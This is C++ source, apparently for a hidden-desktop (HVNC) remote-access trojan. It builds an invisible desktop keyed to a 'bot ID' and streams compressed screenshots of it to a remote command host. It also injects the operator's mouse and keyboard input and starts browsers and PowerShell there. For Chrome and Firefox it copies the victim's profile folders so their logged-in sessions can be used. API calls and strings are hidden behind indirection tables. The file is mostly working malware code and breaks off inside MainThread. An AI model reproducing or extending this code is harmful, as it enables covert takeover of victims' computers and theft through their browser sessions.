#include "HiddenDesktop.h"
#include <windowsx.h>
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <gdiplus.h>
#pragma comment (lib,"Gdiplus.Lib")
using namespace Gdiplus;

enum Connection { desktop, input };
enum Input { mouse };

struct InputMessage
{
    DWORD msg;
    DWORD wParam;
    DWORD lParam;
};

static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
static const COLORREF gc_trans = RGB(255, 174, 201);
static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format

enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };

static int        g_port;
static char       g_host[MAX_PATH];
static BOOL       g_started = FALSE;
static BYTE      *g_pixels = NULL;
static BYTE      *g_oldPixels = NULL;
static BYTE      *g_tempPixels = NULL;
static HDESK      g_hDesk;
static BITMAPINFO g_bmpInfo;
static HANDLE     g_hInputThread, g_hDesktopThread;
static ULONG_PTR  g_gdiplusToken;
static BOOL       g_gdiplusStarted = FALSE;
static char       g_desktopName[MAX_PATH];
static ULARGE_INTEGER lisize;
static LARGE_INTEGER offset;

static void FreePixelBuffers()
{
    Funcs::pFree(g_pixels);
    Funcs::pFree(g_oldPixels);
    Funcs::pFree(g_tempPixels);
    g_pixels = NULL;
    g_oldPixels = NULL;
    g_tempPixels = NULL;
}

static BOOL BitmapToJpg(HDC hDc, HBITMAP hBmpImage, int height)
{
    BOOL ret = FALSE;
    HBITMAP hBmpCopy = NULL;
    IStream *jpegStream = NULL;
    Bitmap *image = NULL;
    Bitmap *jpeg = NULL;
    HBITMAP compressedImage = NULL;
    LARGE_INTEGER streamOffset = { 0 };

    if (!g_gdiplusStarted)
        goto exit;

    // FromHBITMAP rejects bitmaps that are or were selected into a DC
    hBmpCopy = (HBITMAP)CopyImage(hBmpImage, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
    if (!hBmpCopy)
        goto exit;

    if (CreateStreamOnHGlobal(NULL, TRUE, &jpegStream) != S_OK || !jpegStream)
        goto exit;

    image = Bitmap::FromHBITMAP(hBmpCopy, NULL);
    if (!image || image->GetLastStatus() != Ok)
        goto exit;

    if (image->Save(jpegStream, &jpegID, NULL) != Ok)
        goto exit;

    if (jpegStream->Seek(streamOffset, STREAM_SEEK_SET, NULL) != S_OK)
        goto exit;

    jpeg = Bitmap::FromStream(jpegStream);
    if (!jpeg || jpeg->GetLastStatus() != Ok)
        goto exit;

    if (jpeg->GetHBITMAP(Color::White, &compressedImage) != Ok)
        goto exit;

    if (Funcs::pGetDIBits(hDc, compressedImage, 0, height, g_pixels, (BITMAPINFO *)&g_bmpInfo, DIB_RGB_COLORS) != height)
        goto exit;

    ret = TRUE;

exit:
    if (compressedImage)
        Funcs::pDeleteObject(compressedImage);
    delete jpeg;
    delete image;
    if (hBmpCopy)
        Funcs::pDeleteObject(hBmpCopy);
    if (jpegStream)
        jpegStream->Release();
    return ret;
}

static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
    BOOL ret = FALSE;
    RECT rect;
    Funcs::pGetWindowRect(hWnd, &rect);

    HDC     hDcWindow = Funcs::pCreateCompatibleDC(hDc);
    HBITMAP hBmpWindow = Funcs::pCreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);
    HGDIOBJ hOldBmpWindow = NULL;
    if (!hDcWindow || !hBmpWindow)
        goto exit;

    hOldBmpWindow = Funcs::pSelectObject(hDcWindow, hBmpWindow);
    if (!hOldBmpWindow)
        goto exit;
    if (Funcs::pPrintWindow(hWnd, hDcWindow, 0))
    {
        Funcs::pBitBlt(hDcScreen,
            rect.left,
            rect.top,
            rect.right - rect.left,
            rect.bottom - rect.top,
            hDcWindow,
            0,
            0,
            SRCCOPY);

        ret = TRUE;
    }
    Funcs::pSelectObject(hDcWindow, hOldBmpWindow);
exit:
    if (hBmpWindow)
        Funcs::pDeleteObject(hBmpWindow);
    if (hDcWindow)
        Funcs::pDeleteDC(hDcWindow);
    return ret;
}

static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
    HWND currentWindow = Funcs::pGetTopWindow(owner);
    if (currentWindow == NULL)
        return;
    if ((currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDLAST)) == NULL)
        return;
    while (proc(currentWindow, param) && (currentWindow = Funcs::pGetWindow(currentWindow, GW_HWNDPREV)) != NULL);
}

struct EnumHwndsPrintData
{
    HDC hDc;
    HDC hDcScreen;
};

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
    EnumHwndsPrintData *data = (EnumHwndsPrintData *)lParam;

    if (!Funcs::pIsWindowVisible(hWnd))
        return TRUE;

    PaintWindow(hWnd, data->hDc, data->hDcScreen);

    DWORD style = Funcs::pGetWindowLongA(hWnd, GWL_EXSTYLE);
    Funcs::pSetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);

    OSVERSIONINFO versionInfo;
    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
    Funcs::pGetVersionExA(&versionInfo);
    if (versionInfo.dwMajorVersion < 6)
        EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
    return TRUE;
}

// Returns TRUE when there is no frame to send: unchanged pixels or capture failure
static BOOL GetDeskPixels(int serverWidth, int serverHeight)
{
    BOOL captureSuccess = FALSE;
    BOOL comparePixels = TRUE;
    HDC hDc = NULL;
    HDC hDcScreen = NULL;
    HDC hDcScreenResized = NULL;
    HBITMAP hBmpScreen = NULL;
    HBITMAP hBmpScreenResized = NULL;
    HGDIOBJ hOldBmpScreen = NULL;
    HGDIOBJ hOldBmpScreenResized = NULL;
    EnumHwndsPrintData data;
    RECT rect;
    HWND hWndDesktop = Funcs::pGetDesktopWindow();
    Funcs::pGetWindowRect(hWndDesktop, &rect);

    hDc = Funcs::pGetDC(NULL);
    if (!hDc)
        goto cleanup;

    hDcScreen = Funcs::pCreateCompatibleDC(hDc);
    if (!hDcScreen)
        goto cleanup;

    hBmpScreen = Funcs::pCreateCompatibleBitmap(hDc, rect.right, rect.bottom);
    if (!hBmpScreen)
        goto cleanup;

    hOldBmpScreen = Funcs::pSelectObject(hDcScreen, hBmpScreen);
    if (!hOldBmpScreen)
        goto cleanup;

    data.hDc = hDc;
    data.hDcScreen = hDcScreen;

    EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

    if (serverWidth > rect.right)
        serverWidth = rect.right;
    if (serverHeight > rect.bottom)
        serverHeight = rect.bottom;

    if (serverWidth != rect.right || serverHeight != rect.bottom)
    {
        hBmpScreenResized = Funcs::pCreateCompatibleBitmap(hDc, serverWidth, serverHeight);
        if (!hBmpScreenResized)
            goto cleanup;

        hDcScreenResized = Funcs::pCreateCompatibleDC(hDc);
        if (!hDcScreenResized)
            goto cleanup;

        hOldBmpScreenResized = Funcs::pSelectObject(hDcScreenResized, hBmpScreenResized);
        if (!hOldBmpScreenResized)
            goto cleanup;
        Funcs::pSetStretchBltMode(hDcScreenResized, HALFTONE);
        if (!Funcs::pStretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
            hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY))
        {
            goto cleanup;
        }

        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
        hOldBmpScreen = NULL;
        Funcs::pDeleteObject(hBmpScreen);
        Funcs::pDeleteDC(hDcScreen);

        hBmpScreen = hBmpScreenResized;
        hDcScreen = hDcScreenResized;
        hOldBmpScreen = hOldBmpScreenResized;
        hBmpScreenResized = NULL;
        hDcScreenResized = NULL;
        hOldBmpScreenResized = NULL;
    }

    g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

    if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
    {
        FreePixelBuffers();

        g_pixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
        g_oldPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
        g_tempPixels = (BYTE *)Alloc(g_bmpInfo.bmiHeader.biSizeImage);

        comparePixels = FALSE;
        if (!g_pixels || !g_oldPixels || !g_tempPixels)
        {
            FreePixelBuffers();
            goto cleanup;
        }
    }

    g_bmpInfo.bmiHeader.biWidth = serverWidth;
    g_bmpInfo.bmiHeader.biHeight = serverHeight;

    if (!Funcs::pBitBlt(hDcScreen, 0, 0, serverWidth, serverHeight, hDc, 0, 0, SRCCOPY))
        goto cleanup;

    Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    hOldBmpScreen = NULL;

    if (BitmapToJpg(hDcScreen, hBmpScreen, serverHeight))
        captureSuccess = TRUE;
    // Fall back to raw pixels if GDI+ JPEG encoding fails
    else if (Funcs::pGetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS) == serverHeight)
        captureSuccess = TRUE;

cleanup:
    if (hOldBmpScreenResized && hDcScreenResized)
        Funcs::pSelectObject(hDcScreenResized, hOldBmpScreenResized);
    if (hBmpScreenResized)
        Funcs::pDeleteObject(hBmpScreenResized);
    if (hDcScreenResized)
        Funcs::pDeleteDC(hDcScreenResized);

    if (hOldBmpScreen && hDcScreen)
        Funcs::pSelectObject(hDcScreen, hOldBmpScreen);
    if (hBmpScreen)
        Funcs::pDeleteObject(hBmpScreen);
    if (hDc)
        Funcs::pReleaseDC(NULL, hDc);
    if (hDcScreen)
        Funcs::pDeleteDC(hDcScreen);

    if (!captureSuccess)
    {
        g_bmpInfo.bmiHeader.biWidth = 0;
        g_bmpInfo.bmiHeader.biHeight = 0;
        // Treat a failed capture as an unchanged frame so the caller skips it
        return TRUE;
    }

    if (comparePixels)
    {
        for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
        {
            if (g_pixels[i] == GetRValue(gc_trans) &&
                g_pixels[i + 1] == GetGValue(gc_trans) &&
                g_pixels[i + 2] == GetBValue(gc_trans))
            {
                ++g_pixels[i + 1];
            }
        }

        Funcs::pMemcpy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);

        BOOL same = TRUE;
        for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3)
        {
            if (g_pixels[i] == g_oldPixels[i] &&
                g_pixels[i + 1] == g_oldPixels[i + 1] &&
                g_pixels[i + 2] == g_oldPixels[i + 2])
            {
                g_pixels[i] = GetRValue(gc_trans);
                g_pixels[i + 1] = GetGValue(gc_trans);
                g_pixels[i + 2] = GetBValue(gc_trans);
            }
            else
                same = FALSE;
        }
        if (same)
            return TRUE;

        Funcs::pMemcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage);
    }
    else
        Funcs::pMemcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
    return FALSE;
}

static SOCKET ConnectServer()
{
    WSADATA     wsa;
    SOCKET      s;
    SOCKADDR_IN addr;

    if (Funcs::pWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return NULL;
    if ((s = Funcs::pSocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        return NULL;

    hostent *he = Funcs::pGethostbyname(g_host);
    Funcs::pMemcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    addr.sin_family = AF_INET;
    addr.sin_port = Funcs::pHtons(g_port);

    if (Funcs::pConnect(s, (sockaddr *)&addr, sizeof(addr)) < 0)
        return NULL;

    return s;
}

static BOOL SendAll(SOCKET s, const void *buffer, int size)
{
    const char *data = (const char *)buffer;
    int sent = 0;
    while (sent != size)
    {
        int ret = Funcs::pSend(s, data + sent, size - sent, 0);
        if (ret <= 0)
            return FALSE;
        sent += ret;
    }
    return TRUE;
}

static BOOL RecvAll(SOCKET s, void *buffer, int size)
{
    char *data = (char *)buffer;
    int received = 0;
    while (received != size)
    {
        int ret = Funcs::pRecv(s, data + received, size - received, 0);
        if (ret <= 0)
            return FALSE;
        received += ret;
    }
    return TRUE;
}

static BOOL SendInt(SOCKET s, int i)
{
    return SendAll(s, &i, (int)sizeof(i));
}

static BOOL RecvInt(SOCKET s, int *i)
{
    return RecvAll(s, i, (int)sizeof(*i));
}

static DWORD WINAPI DesktopThread(LPVOID param)
{
    DWORD sessionId = (DWORD)(ULONG_PTR)param;
    SOCKET s = ConnectServer();

    if (!Funcs::pSetThreadDesktop(g_hDesk))
        goto exit;

    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
        goto exit;
    if (!SendInt(s, Connection::desktop))
        goto exit;
    if (!SendInt(s, (int)sessionId))
        goto exit;

    for (;;)
    {
        int width, height;

        if (!RecvInt(s, &width))
            goto exit;
        if (!RecvInt(s, &height))
            goto exit;

        BOOL same = GetDeskPixels(width, height);
        if (same)
        {
            if (!SendInt(s, 0))
                goto exit;
            continue;
        }

        if (!SendInt(s, 1))
            goto exit;

        DWORD workSpaceSize;
        DWORD fragmentWorkSpaceSize;
        Funcs::pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
        BYTE *workSpace = (BYTE *)Alloc(workSpaceSize);

        DWORD size;
        Funcs::pRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,
            g_pixels,
            g_bmpInfo.bmiHeader.biSizeImage,
            g_tempPixels,
            g_bmpInfo.bmiHeader.biSizeImage,
            2048,
            &size,
            workSpace);

        Funcs::pFree(workSpace);

        RECT rect;
        HWND hWndDesktop = Funcs::pGetDesktopWindow();
        Funcs::pGetWindowRect(hWndDesktop, &rect);
        if (!SendInt(s, rect.right))
            goto exit;
        if (!SendInt(s, rect.bottom))
            goto exit;
        if (!SendInt(s, g_bmpInfo.bmiHeader.biWidth))
            goto exit;
        if (!SendInt(s, g_bmpInfo.bmiHeader.biHeight))
            goto exit;
        if (!SendInt(s, (int)size))
            goto exit;
        if (!SendAll(s, g_tempPixels, (int)size))
            goto exit;

        int response;
        if (!RecvInt(s, &response))
            goto exit;
    }

exit:
    Funcs::pTerminateThread(g_hInputThread, 0);
    return 0;
}

static void killproc(const char* name)
{
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);
    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes)
    {
        if (strcmp(pEntry.szExeFile, name) == 0)
        {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                (DWORD)pEntry.th32ProcessID);
            if (hProcess != NULL)
            {
                TerminateProcess(hProcess, 9);
                CloseHandle(hProcess);
            }
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }
    CloseHandle(hSnapShot);
}

static void StartChrome()
{
    char chromePath[MAX_PATH] = { 0 };
    Funcs::pSHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
    Funcs::pLstrcatA(chromePath, Strs::hd7);

    char dataPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(dataPath, chromePath);
    Funcs::pLstrcatA(dataPath, Strs::hd10);

    char botId[BOT_ID_LEN] = { 0 };
    char newDataPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(newDataPath, chromePath);
    GetBotId(botId);
    Funcs::pLstrcatA(newDataPath, botId);

    CopyDir(dataPath, newDataPath);

    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::chromeExe);
    Funcs::pLstrcatA(path, Strs::hd9);
    Funcs::pLstrcatA(path, "\"");
    Funcs::pLstrcatA(path, newDataPath);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartEdge()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::edgeExe);
    Funcs::pLstrcatA(path, Strs::hd9);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartBrave()
{
    killproc("brave.exe");
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::braveExe);
    Funcs::pLstrcatA(path, Strs::hd9);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartFirefox()
{
    char firefoxPath[MAX_PATH] = { 0 };
    Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
    Funcs::pLstrcatA(firefoxPath, Strs::hd11);

    char profilesIniPath[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(profilesIniPath, firefoxPath);
    Funcs::pLstrcatA(profilesIniPath, Strs::hd5);

    HANDLE hProfilesIni = CreateFileA
    (
        profilesIniPath,
        FILE_READ_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hProfilesIni == INVALID_HANDLE_VALUE)
        return;

    DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
    DWORD read;
    char *profilesIniContent = (char *)Alloc(profilesIniSize + 1);
    BOOL isRelative = FALSE;
    char *isRelativeRead = NULL;
    char *path = NULL;
    char *pathEnd = NULL;
    char realPath[MAX_PATH] = { 0 };
    char botId[BOT_ID_LEN];
    char newPath[MAX_PATH];
    char browserPath[MAX_PATH] = { 0 };
    STARTUPINFOA startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
    profilesIniContent[profilesIniSize] = 0;

    isRelativeRead = Funcs::pStrStrA(profilesIniContent, Strs::hd12);
    if (!isRelativeRead)
        goto exit;
    isRelativeRead += 11;
    isRelative = (*isRelativeRead == '1');

    path = Funcs::pStrStrA(profilesIniContent, Strs::hd13);
    if (!path)
        goto exit;
    pathEnd = Funcs::pStrStrA(path, "\r");
    if (!pathEnd)
        goto exit;
    *pathEnd = 0;
    path += 5;

    if (isRelative)
        Funcs::pLstrcpyA(realPath, firefoxPath);
    Funcs::pLstrcatA(realPath, path);

    GetBotId(botId);

    Funcs::pLstrcpyA(newPath, firefoxPath);
    Funcs::pLstrcatA(newPath, botId);

    CopyDir(realPath, newPath);

    Funcs::pLstrcpyA(browserPath, Strs::hd8);
    Funcs::pLstrcatA(browserPath, Strs::firefoxExe);
    Funcs::pLstrcatA(browserPath, Strs::hd14);
    Funcs::pLstrcatA(browserPath, "\"");
    Funcs::pLstrcatA(browserPath, newPath);
    Funcs::pLstrcatA(browserPath, "\"");

    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    Funcs::pCreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

exit:
    Funcs::pCloseHandle(hProfilesIni);
    Funcs::pFree(profilesIniContent);

}

static void StartPowershell()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::powershell);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartIe()
{
    char path[MAX_PATH] = { 0 };
    Funcs::pLstrcpyA(path, Strs::hd8);
    Funcs::pLstrcatA(path, Strs::iexploreExe);

    STARTUPINFOA startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.lpDesktop = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static DWORD WINAPI InputThread(LPVOID param)
{
    SOCKET s = ConnectServer();

    Funcs::pSetThreadDesktop(g_hDesk);

    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
        return 0;
    if (!SendInt(s, Connection::input))
        return 0;

    int sessionId;
    if (!RecvInt(s, &sessionId) || !sessionId)
        return 0;

    g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, (LPVOID)(ULONG_PTR)(DWORD)sessionId, 0, 0);

    POINT      lastPoint;
    BOOL       lmouseDown = FALSE;
    HWND       hResMoveWindow = NULL;
    LRESULT    resMoveType = NULL;

    lastPoint.x = 0;
    lastPoint.y = 0;

    for (;;)
    {
        InputMessage input;
        if (!RecvAll(s, &input, (int)sizeof(input)))
            goto exit;

        UINT   msg = (UINT)input.msg;
        WPARAM wParam = (WPARAM)input.wParam;
        LPARAM lParam = (LPARAM)input.lParam;

        HWND  hWnd{};
        POINT point;
        POINT lastPointCopy;
        BOOL  mouseMsg = FALSE;

        switch (msg)
        {
        case WmStartApp::startExplorer:
        {
            const DWORD neverCombine = 2;
            const char *valueName = Strs::hd4;

            HKEY hKey;
            Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey);
            DWORD value;
            DWORD size = sizeof(DWORD);
            DWORD type = REG_DWORD;
            Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size);

            if (value != neverCombine)
                Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);

            char explorerPath[MAX_PATH] = { 0 };
            Funcs::pGetWindowsDirectoryA(explorerPath, MAX_PATH);
            Funcs::pLstrcatA(explorerPath, Strs::fileDiv);
            Funcs::pLstrcatA(explorerPath, Strs::explorerExe);

            STARTUPINFOA startupInfo = { 0 };
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.lpDesktop = g_desktopName;
            PROCESS_INFORMATION processInfo = { 0 };
            Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

            APPBARDATA appbarData;
            appbarData.cbSize = sizeof(appbarData);
            for (int i = 0; i < 5; ++i)
            {
                Sleep(1000);
                appbarData.hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
                if (appbarData.hWnd)
                    break;
            }

            appbarData.lParam = ABS_ALWAYSONTOP;
            Funcs::pSHAppBarMessage(ABM_SETSTATE, &appbarData);

            Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
            Funcs::pRegCloseKey(hKey);
            break;
        }
        case WmStartApp::startRun:
        {
            char rundllPath[MAX_PATH] = { 0 };
            Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
            lstrcatA(rundllPath, Strs::hd2);

            STARTUPINFOA startupInfo = { 0 };
            startupInfo.cb = sizeof(startupInfo);
            startupInfo.lpDesktop = g_desktopName;
            PROCESS_INFORMATION processInfo = { 0 };
            Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
            break;
        }
        case WmStartApp::startPowershell:
        {
            StartPowershell();
            break;
        }
        case WmStartApp::startChrome:
        {
            StartChrome();
            break;
        }
        case WmStartApp::startEdge:
        {
            StartEdge();
            break;
        }
        case WmStartApp::startBrave:
        {
            StartBrave();
            break;
        }
        case WmStartApp::startFirefox:
        {
            StartFirefox();
            break;
        }
        case WmStartApp::startIexplore:
        {
            StartIe();
            break;
        }
        case WM_CHAR:
        case WM_KEYDOWN:
        case WM_KEYUP:
        {
            point = lastPoint;
            hWnd = Funcs::pWindowFromPoint(point);
            break;
        }
        default:
        {
            mouseMsg = TRUE;
            point.x = GET_X_LPARAM(lParam);
            point.y = GET_Y_LPARAM(lParam);
            lastPointCopy = lastPoint;
            lastPoint = point;

            hWnd = Funcs::pWindowFromPoint(point);
            if (msg == WM_LBUTTONUP)
            {
                lmouseDown = FALSE;
                LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);

                switch (lResult)
                {
                case HTTRANSPARENT:
                {
                    Funcs::pSetWindowLongA(hWnd, GWL_STYLE, Funcs::pGetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
                    lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
                    break;
                }
                case HTCLOSE:
                {
                    Funcs::pPostMessageA(hWnd, WM_CLOSE, 0, 0);
                    break;
                }
                case HTMINBUTTON:
                {
                    Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
                    break;
                }
                case HTMAXBUTTON:
                {
                    WINDOWPLACEMENT windowPlacement;
                    windowPlacement.length = sizeof(windowPlacement);
                    Funcs::pGetWindowPlacement(hWnd, &windowPlacement);
                    if (windowPlacement.flags & SW_SHOWMAXIMIZED)
                        Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
                    else
                        Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
                    break;
                }
                }
            }
            else if (msg == WM_LBUTTONDOWN)
            {
                lmouseDown = TRUE;
                hResMoveWindow = NULL;

                RECT startButtonRect;
                HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
                Funcs::pGetWindowRect(hStartButton, &startButtonRect);
                if (Funcs::pPtInRect(&startButtonRect, point))
                {
                    Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
                    continue;
                }
                else
                {
                    char windowClass[MAX_PATH] = { 0 };
                    Funcs::pRealGetWindowClassA(hWnd, windowClass, MAX_PATH);

                    if (!Funcs::pLstrcmpA(windowClass, Strs::hd1))
                    {
                        HMENU hMenu = (HMENU)Funcs::pSendMessageA(hWnd, MN_GETHMENU, 0, 0);
                        int itemPos = Funcs::pMenuItemFromPoint(NULL, hMenu, point);
                        int itemId = Funcs::pGetMenuItemID(hMenu, itemPos);
                        Funcs::pPostMessageA(hWnd, 0x1e5, itemPos, 0);
                        Funcs::pPostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
                        continue;
                    }
                }
            }
            else if (msg == WM_MOUSEMOVE)
            {
                if (!lmouseDown)
                    continue;

                if (!hResMoveWindow)
                    resMoveType = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
                else
                    hWnd = hResMoveWindow;

                int moveX = lastPointCopy.x - point.x;
                int moveY = lastPointCopy.y - point.y;

                RECT rect;
                Funcs::pGetWindowRect(hWnd, &rect);

                int x = rect.left;
                int y = rect.top;
                int width = rect.right - rect.left;
                int height = rect.bottom - rect.top;
                switch (resMoveType)
                {
                case HTCAPTION:
                {
                    x -= moveX;
                    y -= moveY;
                    break;
                }
                case HTTOP:
                {
                    y -= moveY;
                    height += moveY;
                    break;
                }
                case HTBOTTOM:
                {
                    height -= moveY;
                    break;
                }
                case HTLEFT:
                {
                    x -= moveX;
                    width += moveX;
                    break;
                }
                case HTRIGHT:
                {
                    width -= moveX;
                    break;
                }
                case HTTOPLEFT:
                {
                    y -= moveY;
                    height += moveY;
                    x -= moveX;
                    width += moveX;
                    break;
                }
                case HTTOPRIGHT:
                {
                    y -= moveY;
                    height += moveY;
                    width -= moveX;
                    break;
                }
                case HTBOTTOMLEFT:
                {
                    height -= moveY;
                    x -= moveX;
                    width += moveX;
                    break;
                }
                case HTBOTTOMRIGHT:
                {
                    height -= moveY;
                    width -= moveX;
                    break;
                }
                default:
                    continue;
                }
                Funcs::pMoveWindow(hWnd, x, y, width, height, FALSE);
                hResMoveWindow = hWnd;
                continue;
            }
            break;
        }
        }

        for (HWND currHwnd = hWnd;;)
        {
            hWnd = currHwnd;
            Funcs::pScreenToClient(currHwnd, &point);
            currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
            if (!currHwnd || currHwnd == hWnd)
                break;
        }

        if (mouseMsg)
            lParam = MAKELPARAM(point.x, point.y);

        Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
    }
exit:
    Funcs::pTerminateThread(g_hDesktopThread, 0);
    return 0;
}

static DWORD WINAPI MainThread(LPVOID param)
{
    Funcs::pMemset(g_desktopName, 0, sizeof(g_desktopName));
    GetBotId(g_desktopName);

    Funcs::pMemset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
    g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
    g_bmpInfo.bmiHeader.biPlanes = 1;
    g_bmpInfo.bmiHeader.biBitCount = 24;
    g_bmpInfo.bmiHeader.biCompression = BI_RGB;
    g_bmpInfo.bmiHeader.biClrUsed = 0;

    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL) == Ok)
        g_gdiplusStarted = TRUE;

